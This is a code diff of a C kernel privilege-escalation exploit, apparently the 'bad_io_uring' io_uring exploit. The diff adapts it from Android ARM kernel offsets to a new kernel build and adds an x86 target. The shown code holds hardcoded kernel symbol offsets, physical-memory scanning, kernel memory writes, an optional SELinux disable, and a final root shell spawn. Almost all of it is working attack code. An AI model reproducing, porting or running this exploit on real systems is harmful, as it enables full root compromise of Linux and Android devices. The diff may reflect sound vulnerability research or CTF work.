@@ -1,8 +1,3 @@
-
-// Exploit adapted by kexploit
-// Original kernel name: ingots_5.10.66
-// Adaptation kernel name: ingots_5.10.101
-
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
@@ -355,10 +350,7 @@ enum {
 #define SYS_IO_URING_SETUP 425
 #define SYS_IO_URING_ENTER 426
 
-#include <android/log.h>
-
 #define LOG(fmt, ...) do { \
-  __android_log_print(ANDROID_LOG_INFO, "bad_io_uring", fmt, ##__VA_ARGS__); \
   printf(fmt "\n", ##__VA_ARGS__); \
   } while(0)
 
@@ -515,6 +507,9 @@ usize kaslr_base = 0;
 usize phys_base = 0;
 usize linear_base = 0;
 
+#define ARM
+#ifdef ARM
+
 // for arm 5.10.66 android kernel from ingots
 
 #define LIBC_PATH "/apex/com.android.runtime/lib64/bionic/libc.so"
@@ -526,9 +521,9 @@ usize linear_base = 0;
 #define KERNEL_BASE 0xffffffc010000000
 
 // on arm this symbol is called memstart_addr
-#define PAGE_OFFSET_BASE (0xffffffc0124cdc00 - KERNEL_BASE)
-#define PIPE_OPS_OFFSET (0xffffffc01233d168 - KERNEL_BASE)
-#define INIT_OFFSET (0xffffffc0129cbe80 - KERNEL_BASE)
+#define PAGE_OFFSET_BASE (0xffffffc0124c9998 - KERNEL_BASE)
+#define PIPE_OPS_OFFSET (0xffffffc0123396e8 - KERNEL_BASE)
+#define INIT_OFFSET (0xffffffc0129cbe40 - KERNEL_BASE)
 
 // optinally define to turn off selinux
 #define SELINUX_STATE_OFFSET (0xffffffc012c73b18 - KERNEL_BASE)
@@ -551,6 +546,38 @@ usize is_linear_address(usize addr) {
 usize is_kernel_address(usize addr) {
   return (addr & 0xffffffc000000000) == 0xffffffc000000000;
 }
+
+#else
+
+// for x86 build of 5.10.66 kernel using lts kernel config from kernelctf
+
+#define LIBC_PATH "/lib/x86_64-linux-gnu/libc.so.6"
+#define SHELL "/bin/bash"
+
+#define SPRAY_SIZE 192
+
+#define KERNEL_BASE 0xffffffff81000000
+
+#define PAGE_OFFSET_BASE (0xffffffff82edd490 - KERNEL_BASE)
+#define PIPE_OPS_OFFSET (0xffffffff829bf180 - KERNEL_BASE)
+#define INIT_OFFSET (0xffffffff83615940 - KERNEL_BASE)
+
+// first 64 bit word of kernel image
+#define KERNEL_START_WORD 0x4802603f51258d48
+
+usize addr_to_page(usize addr) {
+  return ((addr >> 12) << 6) + vmem_base;
+}
+
+usize is_linear_address(usize addr) {
+  return (addr & 0xffff000000000000) == 0xffff000000000000;
+}
+
+usize is_kernel_address(usize addr) {
+  return (addr & 0xffffffff80000000) == 0xffffffff80000000;
+}
+
+#endif
 
 typedef struct {
   IoUring io_uring;
@@ -838,6 +865,8 @@ void write_mem(unsigned long addr, unsigned long *data, unsigned size) {
   }
 }
 
+#ifdef ARM
+
 void scan_kernel_phys_base() {
   // scanning did not work for some reason
   phys_base = PHYS_BASE;
@@ -851,6 +880,22 @@ void scan_kernel_phys_base() {
   //   phys_base += 0x1000;
   // }
 }
+
+#else
+
+void scan_kernel_phys_base() {
+  usize start_bytes = KERNEL_START_WORD;
+  phys_base = 0;
+  for (;;) {
+    if (read64(phys_base) == start_bytes) {
+      break;
+    }
+
+    phys_base += 0x1000;
+  }
+}
+
+#endif
 
 void exploit() {
   int start_step_pipes[2] = { 0 };
@@ -1111,9 +1156,6 @@ void exploit() {
   write64_kernel(SELINUX_STATE_OFFSET + kaslr_base - 7, 0);
 #endif
 
-  // stop subsequent execs from loading the so and running it again
-  unsetenv("LD_PRELOAD");
-
   system(SHELL);
 
   while (1) {
@@ -1121,12 +1163,12 @@ void exploit() {
   }
 }
 
-static void init() __attribute__((constructor));
-void init() {
+int main() {
   puts("Starting exploit...");
-  LOG("starting...");
 
   pin_to_cpu(0);
 
   exploit();
+
+  return 0;
 }
